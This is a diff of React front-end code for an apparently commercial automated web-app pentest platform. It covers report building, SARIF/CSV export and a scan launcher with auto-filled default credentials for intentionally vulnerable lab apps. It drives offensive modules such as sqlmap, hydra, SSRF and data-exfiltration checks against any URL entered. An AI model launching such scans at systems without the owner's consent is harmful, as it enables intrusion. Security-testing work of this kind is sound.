+        ...(cfg || {}),
+        companyName:  cfg.companyName  || "VulnusLab",
+        reporterName: (cfg.reporterName && cfg.reporterName !== "Security Analyst") ? cfg.reporterName : "VulnusLab Automated Pentest",
+        reporterRole: (cfg.reporterRole && cfg.reporterRole !== "Penetration Tester") ? cfg.reporterRole : "Security Assessment Engine - vulnuslab.com",
+        customLogo:   cfg.customLogo   || null,
+        template:     cfg.template     || "standard",
+      },
+      moduleKey:   "webapp",
+      moduleLabel: "Web Application Pentest",
+      moduleTitle: "PENETRATION TEST REPORT",
+      moduleSubtitle: "Web Application Security Assessment",
+      playbookPath: "03_webapp.md",
+      methodology: [
+        "Web application testing follows OWASP Web Security Testing Guide (WSTG) v4.2 + OWASP Top 10 (2021).",
+        "Each scanner targets a specific vulnerability class (injection, auth, sensitive data, broken access control, etc.) using context-aware payloads with zero-FP confirmation.",
+        "Every finding has been actively triggered and re-confirmed.",
+      ],
+    });
+    // Legacy code below kept commented for one cycle in case rollback is needed.
+    /*
+    generatePDF({
+      target, riskScore, riskLabel,
+      remediation: _remediation,
+      webappCoverage: computeWebappCoverage(allResults),
+      companyName:  cfg.companyName  || "VulnusLab",
+      reporterName: (cfg.reporterName && cfg.reporterName !== "Security Analyst") ? cfg.reporterName : "VulnusLab Automated Pentest",
+      reporterRole: (cfg.reporterRole && cfg.reporterRole !== "Penetration Tester") ? cfg.reporterRole : "Security Assessment Engine · vulnuslab.com",
+      customLogo:   cfg.customLogo   || null,
+      template:     cfg.template     || "standard",
+      date: (cfg.date ? cfg.date + " " : "") + new Date().toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit'}),
+      summary: { critical: allFindings.filter(f=>f.severity==="CRITICAL").length, high: allFindings.filter(f=>f.severity==="HIGH").length, medium: allFindings.filter(f=>f.severity==="MEDIUM").length, low: allFindings.filter(f=>f.severity==="LOW").length },
+      findings:  allFindings,
+      ports:     allResults["nmap"]     ? allResults["nmap"].ports        : [],
+      gobuster:  allResults["gobuster"] ? allResults["gobuster"].discovered: [],
+      ffuf:      allResults["ffuf"]     ? allResults["ffuf"].discovered   : [],
+      whatweb:   allResults["whatweb"]  ? allResults["whatweb"].output    : "",
+      toolsUsed,
+      sqlmap:     allResults["sqlmap"]     || null,
+      subdomains:  allResults["subdomains"] ? (allResults["subdomains"].subdomains || []) : [],
+      dns:         allResults["dig"]        ? (allResults["dig"].records        || {}) : {},
+      wafw00f:    allResults["wafw00f"]    || null,
+      cms:        allResults["cms"]        || null,
+      ssl:        allResults["ssl"]        || null,
+      cookies:    allResults["cookies"]    || null,
+      cors:         allResults["cors"]         || null,
+      xss:          allResults["xss"]          || null,
+      commix:       allResults["commix"]       || null,
+      lfi:          allResults["lfi"]          || null,
+      openredirect: allResults["openredirect"] || null,
+      sensitivefiles:allResults["sensitivefiles"]||null,
+      hydra:        allResults["hydra"]        || null,
+      ssrf:         allResults["ssrf"]         || null,
+      xxe:          allResults["xxe"]          || null,
+      clickjacking:     allResults["clickjacking"]     || null,
+      verbtamper:       allResults["verbtamper"]       || null,
+      pollution:        allResults["pollution"]        || null,
+      csrf:             allResults["csrf"]             || null,
+      idor:             allResults["idor"]             || null,
+      ssti:             allResults["ssti"]             || null,
+      fileupload:       allResults["fileupload"]       || null,
+      deserial:         allResults["deserial"]         || null,
+      protopollution:   allResults["protopollution"]   || null,
+      typejuggling:     allResults["typejuggling"]     || null,
+      jwt:              allResults["jwt"]              || null,
+      graphql:          allResults["graphql"]          || null,
+      nosql:            allResults["nosql"]            || null,
+      oauth:            allResults["oauth"]            || null,
+      hostheader:       allResults["hostheader"]       || null,
+      websocket:        allResults["websocket"]        || null,
+      takeover:         allResults["takeover"]         || null,
+      otp:              allResults["otp"]              || null,
+      rfi:              allResults["rfi"]              || null,
+      smuggling:        allResults["smuggling"]        || null,
+      responsesplitting:allResults["responsesplitting"]|| null,
+      sessionfixation:  (() => {
+        // If cookies scanner found NO cookies on the target, suppress sessionfixation's
+        // cookie-related findings — they're probing artifacts that contradict Section 12.
+        // Keeps Section 15 status accurate (PASSED instead of false VULNERABLE) and
+        // prevents Section 21 from rendering empty/contradictory cookie advice.
+        const sf = allResults["sessionfixation"];
+        if (!sf) return null;
+        const noCookies = allResults["cookies"] && (!allResults["cookies"].cookies || allResults["cookies"].cookies.length === 0);
+        if (!noCookies) return sf;
+        const filtered = (sf.findings || []).filter(f => !((f.detail || "").toLowerCase().includes("cookie")));
+        return { ...sf, findings: filtered, vulnerable: filtered.some(f => f.severity && f.severity !== "INFO" && f.severity !== "LOW") };
+      })(),
+      dataexfil:        allResults["dataexfil"]        || null,
+      racecondition:    allResults["racecondition"]    || null,
+      smb:              allResults["smb"]              || null,
+      ftp:              allResults["ftp"]              || null,
+      smtp:             allResults["smtp"]             || null,
+      snmp:             allResults["snmp"]             || null,
+    });
+    */ // end of legacy generatePDF block kept commented for rollback
+  };
+
+  // Aggregate findings ONCE — same logic the PDF uses — so CSV / JSON / SARIF
+  // all export from the same source of truth. Includes the Trust-First
+  // metadata (tool, confidence, verified_at, evidence_marker).
+  const _collectFindingsForExport = () => {
+    const collected = [];
+    PHASES.forEach(ph => {
+      if (allResults[ph.tool]?.findings) {
+        allResults[ph.tool].findings.forEach(f => {
+          if (f.severity !== "INFO") collected.push({...f, _tool: ph.tool});
+        });
+      }
+    });
+    if (allResults["xss"]?.vulnerable)    collected.push({_tool:"xss", confidence:"CONFIRMED", severity:"CRITICAL", cvss:"9.0", cve:"N/A", cwe:"CWE-79", cwe_name:"Cross-Site Scripting", detail:"XSS vulnerability detected on target", owasp:"A03:2021", remediation:"Sanitize all user input. Implement CSP."});
+    if (allResults["sqlmap"]?.vulnerable) collected.push({_tool:"sqlmap", confidence:"CONFIRMED", severity:"CRITICAL", cvss:"9.8", cve:"N/A", cwe:"CWE-89", cwe_name:"SQL Injection", detail:"SQL Injection detected", owasp:"A03:2021", remediation:"Use parameterised queries."});
+    return collected;
+  };
+
+  const dlJSON = () => {
+    // Pure raw dump — every scanner's full response.
+    const payload = {
+      schema:    "vulnuslab.json/v1",
+      target,
+      scan_date: new Date().toISOString(),
+      results:   allResults,
+    };
+    const blob = new Blob([JSON.stringify(payload, null, 2)], {type:"application/json"});
+    const a = document.createElement("a"); a.href = URL.createObjectURL(blob);
+    a.download = "pentest_raw_" + Date.now() + ".json"; a.click();
+  };
+
+  const dlCSV = () => {
+    const findings = _collectFindingsForExport();
+    // CSV column set chosen to satisfy security-team intake tools
+    // (most expect: tool, severity, CVSS, CWE, OWASP, confidence,
+    // verified-at, evidence, detail, remediation).
+    const rows = [["Tool","Severity","CVSS","CVE","CWE","CWE Name","OWASP","Confidence","Verified At","Evidence","Finding","Remediation"]];
+    const _esc = (v) => `"${String(v || "").replace(/"/g, '""').replace(/[\r\n]+/g, " ")}"`;
+    findings.forEach(f => rows.push([
+      _esc(f._tool || ""),
+      _esc(f.severity || ""),
+      _esc(f.cvss || ""),
+      _esc(f.cve || ""),
+      _esc(f.cwe || ""),
+      _esc(f.cwe_name || ""),
+      _esc(f.owasp || ""),
+      _esc(f.confidence || "CONFIRMED"),
+      _esc(f.verified_at || ""),
+      _esc(f.evidence_marker || ""),
+      _esc(f.detail || ""),
+      _esc(f.remediation || ""),
+    ]));
+    const csv = rows.map(r => r.join(",")).join("\n");
+    const blob = new Blob([csv], {type:"text/csv"});
+    const a = document.createElement("a"); a.href = URL.createObjectURL(blob);
+    a.download = "pentest_findings_" + Date.now() + ".csv"; a.click();
+  };
+
+  const dlSARIF = () => {
+    // SARIF 2.1.0 — industry-standard schema consumed by GitHub Code
+    // Scanning, GitLab SAST dashboards, Microsoft Defender for Cloud,
+    // VS Code's SARIF Viewer, Azure DevOps. Customers can drop our
+    // SARIF into their existing security pipeline with zero glue code.
+    const findings = _collectFindingsForExport();
+    // Build the unique rules catalog — one SARIF rule per CWE
+    const ruleMap = {};
+    findings.forEach(f => {
+      const id = f.cwe || "VULN-UNKNOWN";
+      if (!ruleMap[id]) {
+        ruleMap[id] = {
+          id,
+          name: f.cwe_name || "Security Finding",
+          shortDescription: { text: f.cwe_name || "Security Finding" },
+          fullDescription:  { text: f.cwe_name || "Security Finding" },
+          help: { text: f.remediation || "Apply security hardening.",
+                  markdown: `**Remediation:** ${f.remediation || "Apply security hardening."}` },
+          properties: {
+            "security-severity": String(f.cvss || "5.0"),
+            tags: ["security", f.owasp || ""].filter(Boolean),
+          },
+        };
+      }
+    });
+    const _sevLevel = (s) => {
+      // SARIF only has: none / note / warning / error
+      if (s === "CRITICAL" || s === "HIGH") return "error";
+      if (s === "MEDIUM") return "warning";
+      return "note";
+    };
+    const sarif = {
+      $schema: "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
+      version: "2.1.0",
+      runs: [{
+        tool: {
+          driver: {
+            name:    "VulnusLab",
+            version: "1.0.0",
+            informationUri: "https://vulnuslab.com",
+            rules: Object.values(ruleMap),
+          },
+        },
+        results: findings.map(f => ({
+          ruleId: f.cwe || "VULN-UNKNOWN",
+          level:  _sevLevel(f.severity),
+          message: { text: f.detail || "Security finding" },
+          locations: [{
+            physicalLocation: {
+              artifactLocation: { uri: target || "unknown-target" },
+            },
+          }],
+          properties: {
+            tool:        f._tool || "",
+            severity:    f.severity || "",
+            cvss:        f.cvss || "",
+            confidence:  f.confidence || "CONFIRMED",
+            verified_at: f.verified_at || "",
+            evidence:    f.evidence_marker || "",
+            owasp:       f.owasp || "",
+          },
+        })),
+        invocations: [{
+          executionSuccessful: true,
+          startTimeUtc: new Date().toISOString(),
+        }],
+      }],
+    };
+    const blob = new Blob([JSON.stringify(sarif, null, 2)], {type:"application/sarif+json"});
+    const a = document.createElement("a"); a.href = URL.createObjectURL(blob);
+    a.download = "pentest_" + Date.now() + ".sarif"; a.click();
+  };
+
+  return (
+    <div className="fade">
+      <div style={{background:"linear-gradient(135deg,#0c1a3d,#0f172a)",border:"1px solid #1e3a8a",borderRadius:8,padding:20,marginBottom:16}}>
+        {/* Header */}
+        <div style={{display:"flex",alignItems:"center",gap:10,marginBottom:10,flexWrap:"wrap"}}>
+          <span style={{fontSize:20}}></span>
+          <h2 style={{fontSize:16,fontWeight:700,color:"#f1f5f9",margin:0}}>Web Application Penetration Testing</h2>
+          <Badge label={PHASES.length+" PHASES"} color="blue"/>
+          <Badge label="REAL TOOLS" color="green"/>
+          {running && <Badge label="LIVE SCAN" color="blue"/>}
+          {finished && <Badge label="SCAN COMPLETE" color="green"/>}
+        </div>
+
+        {/* Compact "X / Y phases complete" footer shown ONLY when scan
+            finished (rich SCANNING panel below covers the live progress). */}
+        {finished && !running && (
+          <div style={{marginBottom:12,display:"flex",justifyContent:"space-between",alignItems:"center"}}>
+            <span style={{fontSize:11,color:"#22c55e",fontFamily:"JetBrains Mono,monospace",fontWeight:700}}>
+              {done.length} / {PHASES.length} phases complete
+            </span>
+            <span style={{fontSize:11,color:"#22c55e",fontFamily:"JetBrains Mono,monospace",fontWeight:700}}>100%</span>
+          </div>
+        )}
+
+        {/* Login-verified targets only. Each chip auto-fills working
+            credentials. WebGoat removed — upstream image keeps renaming
+            login routes between versions, breaking auto-login. */}
+        <TestTargets targets={[
+          {label:"DVWA",       value:"http://lab_dvwa",                   color:"#dc2626", lab:"dvwa"},
+          {label:"bWAPP",      value:"http://lab_bwapp/bWAPP/login.php",  color:"#ca8a04", lab:"bwapp"},
+          {label:"Mutillidae", value:"http://lab_mutillidae",             color:"#a855f7", lab:"mutillidae"},
+          {label:"Juice Shop", value:"http://lab_juiceshop:3000",         color:"#16a34a", lab:"juiceshop"},
+        ]} onSelect={async (t, lab) => {
+          setTarget(t);
+          setAuthorized(false);
+          setShowHistory(false);
+          const LAB_CREDS = {
+            // Verified-working credentials. WebGoat + Juice Shop require
+            // self-registration before login; backend auto-registers when
+            // it sees the WebGoat/Juice Shop URL patterns (login_helper.py
+            // WEBGOAT-AUTOREG-V1 fix).
+            dvwa:       { url: "http://lab_dvwa/login.php",                              user: "admin",              pass: "password" },
+            webgoat:    { url: "http://lab_webgoat:8080/WebGoat/login",                  user: "vluser",             pass: "VLpass123"},
+            juiceshop:  { url: "http://lab_juiceshop:3000/rest/user/login",              user: "vluser@vl.local",    pass: "VLpass123"},
+            mutillidae: { url: "http://lab_mutillidae/index.php?page=login.php",         user: "admin",              pass: "admin"    },
+            bwapp:      { url: "http://lab_bwapp/bWAPP/login.php",                       user: "bee",                pass: "bug"      },
+          };
+          const creds = lab && LAB_CREDS[lab];
+          if (creds) {
+            setLoginUrl(creds.url);
+            setLoginUser(creds.user);
+            setLoginPass(creds.pass);
+            setShowAuthPanel(true);
+          }
+          if (lab) {
+            try {
+              const d = await api("/api/lab/autologin","POST",{lab},token);
+              if (d?.ok && d?.cookie) {
+                setAuthCookie(d.cookie);
+                localStorage.setItem("cyberAuthCookie", d.cookie);
+              }
+            } catch(e) {}
+          }
+        }}/>
+
+        {/* Target input row */}
+        <div style={{marginTop:8}}>
+          <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:5}}>
+            <label style={{fontSize:11,color:"#64748b",fontWeight:600,letterSpacing:"0.05em",textTransform:"uppercase"}}>Target URL or Domain</label>
+            {targetHistory.length>0 && <button onClick={()=>setShowHistory(h=>!h)} style={{background:"#1e293b",border:"1px solid #334155",borderRadius:4,padding:"2px 8px",color:"#60a5fa",fontSize:10,cursor:"pointer"}}>History ({targetHistory.length})</button>}
+          </div>
+          {showHistory && targetHistory.length>0 && !running && (
+            <div style={{background:"#0f172a",border:"1px solid #1e3a8a",borderRadius:6,marginBottom:8,overflow:"hidden"}}>
+              {targetHistory.map((t,i)=>(
+                <div key={i} onClick={()=>{setTarget(t);setShowHistory(false);}} style={{padding:"7px 14px",cursor:"pointer",borderBottom:i<targetHistory.length-1?"1px solid #1e293b":"none",display:"flex",alignItems:"center",gap:8,fontSize:12,color:"#93c5fd",fontFamily:"JetBrains Mono,monospace"}}
+                  onMouseEnter={e=>e.currentTarget.style.background="#1e293b"} onMouseLeave={e=>e.currentTarget.style.background="transparent"}>
+                  <span style={{color:"#334155",fontSize:10}}>{i+1}</span>{t}
+                </div>
+              ))}
+            </div>
+          )}
+
+          {/* WAP-AUTH-PANEL-V5 — compact Recon-style */}
+          <div style={{marginBottom:10,background:"#020617",border:"1px solid #1e293b",borderRadius:6}}>
+            <div onClick={()=>setShowAuthPanel(o=>!o)} style={{padding:"8px 12px",cursor:"pointer",display:"flex",justifyContent:"space-between",alignItems:"center",userSelect:"none"}}>
+              <div style={{display:"flex",gap:8,alignItems:"center"}}>
+                <span style={{fontSize:11}}>{showAuthPanel?"▼":"▶"}</span>
+                <span style={{fontSize:12,fontWeight:600,color:"#e2e8f0"}}>Authenticated scan (optional)</span>
+                <span style={{fontSize:10,color:"#64748b"}}>— behind-login: IDOR, stored XSS, mass-assignment</span>
+              </div>
+              {(authCookie||authBearer) && <span style={{background:"#052e16",color:"#4ade80",fontSize:10,fontWeight:700,padding:"2px 8px",borderRadius:3}}>credentials ready</span>}
+            </div>
+            {showAuthPanel && (
+              <div style={{padding:"12px",borderTop:"1px solid #1e293b",display:"flex",flexDirection:"column",gap:10}}>
+                <div style={{fontSize:10,color:"#cbd5e1",lineHeight:1.6,background:"#0c1a3d",padding:"8px 10px",borderRadius:5,border:"1px solid #1e3a8a"}}>
+                  <b style={{color:"#86efac"}}>Most customers should leave this empty.</b> Only fill in if your target has a login system AND you want behind-login pages tested.
+                </div>
+                <div style={{background:"#020617",border:"1px solid #1e3a8a",borderRadius:5,padding:"10px 12px"}}>
+                  <div style={{fontSize:11,color:"#86efac",fontWeight:700,marginBottom:6}}>Auto-login (recommended)</div>
+                  <div style={{display:"grid",gridTemplateColumns:"1fr 1fr 1fr",gap:8,marginBottom:8}}>
+                    <input value={loginUrl} onChange={e=>setLoginUrl(e.target.value)} placeholder="Login URL (e.g. /login)" autoComplete="off" style={{background:"#0f172a",border:"1px solid #1e3a8a",borderRadius:4,padding:"7px 10px",color:"#e2e8f0",fontFamily:"JetBrains Mono,monospace",fontSize:11,outline:"none",boxSizing:"border-box"}}/>
+                    <input value={loginUser} onChange={e=>setLoginUser(e.target.value)} placeholder="Username / email" autoComplete="off" name="vl-wap-u" style={{background:"#0f172a",border:"1px solid #1e3a8a",borderRadius:4,padding:"7px 10px",color:"#e2e8f0",fontFamily:"JetBrains Mono,monospace",fontSize:11,outline:"none",boxSizing:"border-box"}}/>
+                    <input value={loginPass} onChange={e=>setLoginPass(e.target.value)} type="password" placeholder="Password" autoComplete="new-password" name="vl-wap-p" style={{background:"#0f172a",border:"1px solid #1e3a8a",borderRadius:4,padding:"7px 10px",color:"#e2e8f0",fontFamily:"JetBrains Mono,monospace",fontSize:11,outline:"none",boxSizing:"border-box"}}/>
+                  </div>
+                  <div style={{display:"flex",gap:10,alignItems:"center",flexWrap:"wrap"}}>
+                    <button onClick={async ()=>{
+                        if(!target.trim()){ setAutoLoginStatus("Enter a target first"); return; }
+                        if(!loginUrl.trim()||!loginUser.trim()||!loginPass.trim()){ setAutoLoginStatus("Login URL + username + password are all required"); return; }
+                        setAutoLoginBusy(true); setAutoLoginStatus(null);
+                        try {
+                          const lr = await api("/api/scan/login","POST",{target, login_url: loginUrl, username: loginUser, password: loginPass, auth_type: "form"}, token);
+                          const _got = (lr && (lr.auth_cookie || lr.auth_bearer));
+                          if (lr && (lr.login_verified || _got)) {
+                            setAuthCookie(lr.auth_cookie || "");
+                            if (lr.auth_bearer) setAuthBearer(lr.auth_bearer);
+                            localStorage.setItem("cyberAuthCookie", lr.auth_cookie || "");
+                            if (lr.auth_bearer) localStorage.setItem("cyberAuthBearer", lr.auth_bearer);
+                            setAutoLoginStatus(lr.fallback ? `ok (via ${lr.fallback})` : "ok");
+                          } else { setAutoLoginStatus(lr?.hint || "Login could not be verified"); }
+                        } catch(e){ setAutoLoginStatus("Login request failed: "+(e.message||e)); }
+                        finally { setAutoLoginBusy(false); }
+                      }} disabled={autoLoginBusy}
+                      style={{background:autoLoginBusy?"#1e293b":"linear-gradient(135deg,#22c55e,#16a34a)",border:"none",borderRadius:4,padding:"7px 14px",color:autoLoginBusy?"#475569":"#0f172a",fontSize:11,fontWeight:700,cursor:autoLoginBusy?"not-allowed":"pointer"}}>
+                      {autoLoginBusy?"Logging in...":"Auto-login & capture cookie"}
+                    </button>
+                    {(autoLoginStatus && autoLoginStatus.startsWith("ok")) && <span style={{fontSize:11,color:"#4ade80",fontWeight:600}}>Logged in — cookie captured</span>}
+                    {(autoLoginStatus && !autoLoginStatus.startsWith("ok")) && <span style={{fontSize:11,color:"#f87171",fontWeight:600}}>{autoLoginStatus}</span>}
+                  </div>
+                </div>
+                <div style={{fontSize:10,color:"#475569",textAlign:"center"}}>— OR paste cookie / bearer manually —</div>
+                <div style={{display:"flex",gap:10,flexWrap:"wrap"}}>
+                  <div style={{flex:1,minWidth:240}}>
+                    <div style={{fontSize:10,color:"#64748b",marginBottom:3,fontWeight:600}}>Session Cookie</div>
+                    <input value={authCookie} onChange={e=>{setAuthCookie(e.target.value);localStorage.setItem("cyberAuthCookie",e.target.value);}} placeholder="PHPSESSID=abc123" style={{width:"100%",background:"#020617",border:"1px solid #1e3a8a",borderRadius:5,padding:"8px 11px",color:"#e2e8f0",fontFamily:"JetBrains Mono,monospace",fontSize:11,outline:"none",boxSizing:"border-box"}}/>
+                  </div>
+                  <div style={{flex:1,minWidth:240}}>
+                    <div style={{fontSize:10,color:"#64748b",marginBottom:3,fontWeight:600}}>Bearer Token</div>
+                    <input value={authBearer} onChange={e=>{setAuthBearer(e.target.value);localStorage.setItem("cyberAuthBearer",e.target.value);}} placeholder="eyJhbGciOiJI..." style={{width:"100%",background:"#020617",border:"1px solid #1e3a8a",borderRadius:5,padding:"8px 11px",color:"#e2e8f0",fontFamily:"JetBrains Mono,monospace",fontSize:11,outline:"none",boxSizing:"border-box"}}/>
+                  </div>
+                </div>
+                {(authCookie||authBearer) && (
+                  <button onClick={()=>{setAuthCookie("");setAuthBearer("");setAutoLoginStatus(null);localStorage.removeItem("cyberAuthCookie");localStorage.removeItem("cyberAuthBearer");}} style={{alignSelf:"flex-start",background:"#1e293b",border:"1px solid #334155",borderRadius:4,padding:"4px 10px",color:"#ef4444",fontSize:10,cursor:"pointer",fontWeight:600}}>Clear auth credentials</button>
+                )}
+              </div>
+            )}
+          </div>
+          <div style={{display:"flex",gap:10,flexWrap:"wrap"}}>
+            {/* Hidden honeypot inputs — Chrome fills these FIRST, leaving the
+                real target field alone. Combined with autoComplete="off" +
+                a non-standard name + data-form-type="other" this kills the
+                "Chrome puts the user's ADMIN username in the target field"
+                annoyance for good. */}
+            <input type="text"     name="username" tabIndex={-1} autoComplete="username"         defaultValue="" style={{position:"absolute",left:-9999,opacity:0,width:1,height:1,pointerEvents:"none"}}/>
+            <input type="password" name="password" tabIndex={-1} autoComplete="current-password" defaultValue="" style={{position:"absolute",left:-9999,opacity:0,width:1,height:1,pointerEvents:"none"}}/>
+            <input value={target} onChange={e=>setTarget(e.target.value)}
+              placeholder="example.com  or  http://192.168.1.1:8080"
+              autoComplete="off" autoCorrect="off" autoCapitalize="off" spellCheck={false}
+              name="webapp-pentest-target" data-form-type="other" aria-autocomplete="none"
+              style={{flex:3,minWidth:220,background:"#020617",border:"1px solid "+(running?"#3b82f6":"#1e3a8a"),borderRadius:6,padding:"11px 14px",color:"#e2e8f0",fontFamily:"JetBrains Mono,monospace",fontSize:13,outline:"none",transition:"border-color 0.2s"}}/>
+            {["lab_dvwa","lab_bwapp","lab_webgoat","lab_mutillidae"].some(l=>target.includes(l)) && !(authCookie||authBearer) && !running && (
+              <div style={{background:"#451a03",border:"1px solid #f97316",borderRadius:6,padding:"8px 14px",color:"#fb923c",fontSize:11,fontWeight:600,display:"flex",alignItems:"center",gap:8,whiteSpace:"nowrap"}}>
+                Auth required — click the target button to auto-login first
+              </div>
+            )}
+            {!running ? (
+              <button onClick={run} disabled={!target.trim()}
+                style={{background:target.trim()?"linear-gradient(135deg,#3b82f6,#06b6d4)":"#1e293b",border:"none",borderRadius:6,padding:"11px 28px",color:target.trim()?"#fff":"#475569",fontSize:13,fontWeight:700,cursor:target.trim()?"pointer":"not-allowed",whiteSpace:"nowrap",transition:"all 0.2s"}}>
+                ▶ Start Full Pentest
+              </button>
+            ) : (
+              <button disabled style={{background:"#0f172a",border:"1px solid #3b82f6",borderRadius:6,padding:"11px 24px",color:"#60a5fa",fontSize:13,fontWeight:700,cursor:"not-allowed",display:"flex",alignItems:"center",gap:8,whiteSpace:"nowrap"}}>
+                <div style={{width:12,height:12,border:"2px solid #3b82f6",borderTopColor:"transparent",borderRadius:"50%",animation:"spin .8s linear infinite",flexShrink:0}}/>
+                Scanning...
+              </button>
+            )}
+            {running && (
+              <button onClick={stop} disabled={stopped}
+                style={{background:"linear-gradient(135deg,#dc2626,#991b1b)",border:"none",borderRadius:6,padding:"11px 22px",color:"#fff",fontSize:13,fontWeight:700,cursor:stopped?"not-allowed":"pointer",display:"flex",alignItems:"center",gap:7,opacity:stopped?0.5:1,transition:"opacity 0.2s",whiteSpace:"nowrap"}}>
+                ■ Stop Scan
+              </button>
+            )}
+            {finished && (() => {
+              const allF=[];
+              PHASES.forEach(ph=>{ if(allResults[ph.tool]?.findings) allResults[ph.tool].findings.forEach(f=>{ if(f.severity!=="INFO") allF.push(f); }); });
+              if(allResults["xss"]?.vulnerable)   allF.push({severity:"CRITICAL"});
+              if(allResults["cors"]?.vulnerable)   allF.push({severity:"HIGH"});
+              if(allResults["sqlmap"]?.vulnerable) allF.push({severity:"CRITICAL"});
+              const _pen=allF.reduce((s,f)=>s+({CRITICAL:15,HIGH:8,MEDIUM:3,LOW:1}[f.severity]||0),0);
+              const sc=Math.max(0,100-_pen);
+              const lb=sc<40?"CRITICAL":sc<70?"HIGH":sc<90?"MEDIUM":sc<100?"LOW":"SAFE";
+              const col={CRITICAL:"#dc2626",HIGH:"#ea580c",MEDIUM:"#ca8a04",LOW:"#16a34a",SAFE:"#16a34a"}[lb];
+              return <>
+                <div style={{background:col,borderRadius:6,padding:"11px 16px",color:"#fff",fontSize:12,fontWeight:700,whiteSpace:"nowrap"}}>RISK: {lb} ({sc}/100)</div>
+                <button onClick={()=>setShowPDFModal(true)} style={{background:"#ef4444",border:"none",borderRadius:6,padding:"11px 18px",color:"#fff",fontSize:13,fontWeight:700,cursor:"pointer",whiteSpace:"nowrap"}}>Report</button>
+                <div style={{position:"relative"}}>
+                  <button onClick={()=>setShowExportMenu(v=>!v)} style={{background:"#1e293b",border:"1px solid #334155",borderRadius:6,padding:"11px 16px",color:"#cbd5e1",fontSize:13,fontWeight:600,cursor:"pointer",whiteSpace:"nowrap",display:"flex",alignItems:"center",gap:6}}>
+                    Export <span style={{fontSize:10,opacity:0.8}}>{showExportMenu?"▴":"▾"}</span>
+                  </button>
+                  {showExportMenu && (
+                    <>
+                      <div onClick={()=>setShowExportMenu(false)} style={{position:"fixed",inset:0,zIndex:50}}/>
+                      <div style={{position:"absolute",top:"calc(100% + 6px)",right:0,minWidth:200,background:"#0f172a",border:"1px solid #334155",borderRadius:6,boxShadow:"0 10px 30px rgba(0,0,0,0.5)",zIndex:51,overflow:"hidden"}}>
+                        <button onClick={()=>{setShowExportMenu(false);dlCSV();}}
+                          style={{display:"flex",alignItems:"center",justifyContent:"space-between",width:"100%",background:"transparent",border:"none",padding:"10px 14px",color:"#f1f5f9",fontSize:12,fontWeight:500,cursor:"pointer",textAlign:"left",borderBottom:"1px solid #1e293b"}}
+                          onMouseEnter={e=>e.currentTarget.style.background="#1e293b"} onMouseLeave={e=>e.currentTarget.style.background="transparent"}>
+                          <span>CSV</span>
+                          <span style={{fontSize:10,color:"#64748b"}}>spreadsheet</span>
+                        </button>
+                        <button onClick={()=>{setShowExportMenu(false);dlJSON();}}
+                          style={{display:"flex",alignItems:"center",justifyContent:"space-between",width:"100%",background:"transparent",border:"none",padding:"10px 14px",color:"#f1f5f9",fontSize:12,fontWeight:500,cursor:"pointer",textAlign:"left",borderBottom:"1px solid #1e293b"}}
+                          onMouseEnter={e=>e.currentTarget.style.background="#1e293b"} onMouseLeave={e=>e.currentTarget.style.background="transparent"}>
+                          <span>JSON</span>
+                          <span style={{fontSize:10,color:"#64748b"}}>API / scripts</span>
+                        </button>
+                        <button onClick={()=>{setShowExportMenu(false);dlSARIF();}}
+                          title="GitHub Code Scanning / GitLab SAST / Defender for Cloud compatible"
+                          style={{display:"flex",alignItems:"center",justifyContent:"space-between",width:"100%",background:"transparent",border:"none",padding:"10px 14px",color:"#f1f5f9",fontSize:12,fontWeight:500,cursor:"pointer",textAlign:"left"}}
+                          onMouseEnter={e=>e.currentTarget.style.background="#1e293b"} onMouseLeave={e=>e.currentTarget.style.background="transparent"}>
+                          <span>SARIF</span>
+                          <span style={{fontSize:10,color:"#64748b"}}>GitHub / SIEM</span>
+                        </button>
+                      </div>
+                    </>
+                  )}
+                </div>
+              </>;
+            })()}
+          </div>
+        </div>
+      </div>
+
+      {/* WAPT-TERMINAL-POSITION-V2 — Terminal moved to bottom of PHASES tab
+          so it appears AFTER all the tools end, not before. */}
+
+      {/* TABS */}
+      <div style={{display:"flex",gap:6,marginBottom:14,flexWrap:"wrap"}}>
+        {[
+          {id:"phases",    label:"Scan Phases"},
+          {id:"findings",  label:"Findings"},
+          {id:"methodology",label:"Methodology"},
+        ].map(t=>(
+          <button key={t.id} onClick={()=>setTab(t.id)}
+            style={{background:tab===t.id?"#1e3a8a":"#0f172a",border:"1px solid "+(tab===t.id?"#3b82f6":"#1e293b"),borderRadius:6,padding:"7px 14px",color:tab===t.id?"#fff":"#64748b",fontSize:12,fontWeight:600,cursor:"pointer"}}>
+            {t.label}
+          </button>
+        ))}
+      </div>
+
+      {/* PHASES TAB */}
+      {tab==="phases" && (
+      <div style={{display:"flex",flexDirection:"column",gap:8}}>
+
+        {/* TOOL-REFRESH-V2 — before the WAPT tools start */}
+        <ToolRefreshButton
+          module="webapp"
+          token={token}
+          disabled={running}
+          onClear={() => {
+            setAll({}); setDone([]); setFailed([]); setFinished(false);
+            setCurPhase(-1); setLines(["Ready — pick a target and click Start"]);
+          }}
+        />
+
+        {/* Badge Legend */}
+        <div style={{display:"flex",alignItems:"center",gap:16,padding:"8px 14px",background:"#0a0f1e",border:"1px solid #1e293b",borderRadius:8,flexWrap:"wrap"}}>
+          <span style={{fontSize:11,color:"#475569",fontWeight:700,letterSpacing:1}}>RESULTS:</span>
+          {[
+            {label:"SECURE",     color:"#4ade80", bg:"#052e16", desc:"No vulnerability found"},
+            {label:"VULNERABLE", color:"#f87171", bg:"#1c0000", desc:"Security issue detected"},
+            {label:"SKIPPED",    color:"#fb923c", bg:"#1c0a00", desc:"Not applicable for this target"},
+            {label:"ERROR",      color:"#f87171", bg:"#1c0000", desc:"Tool had a problem"},
+          ].map((b,i)=>(
+            <div key={i} style={{display:"flex",alignItems:"center",gap:5}}>
+              <span style={{background:b.bg,border:`1px solid ${b.color}50`,color:b.color,fontSize:9,fontWeight:700,padding:"2px 7px",borderRadius:4}}>{b.label}</span>
+              <span style={{fontSize:10,color:"#475569"}}>{b.desc}</span>
+            </div>
+          ))}
+        </div>
+
+        {/* ─── LIVE SCAN TELEMETRY ─── shows only while scan is running.
+             Customer watches findings accumulate in real-time + sees ETA,
+             current phase, and progress bar. Trust-building feedback —
+             without this, scans feel like a 5-min black-box spinner. */}
+        {running && (() => {
+          const doneCount = done.length;
+          const totalCount = (selectedPhases?.size || PHASES.length) || 1;
+          const elapsed = Math.floor((Date.now() - scanStart) / 1000);
+          const fmt = s => `${Math.floor(s/60)}:${String(s%60).padStart(2,"0")}`;
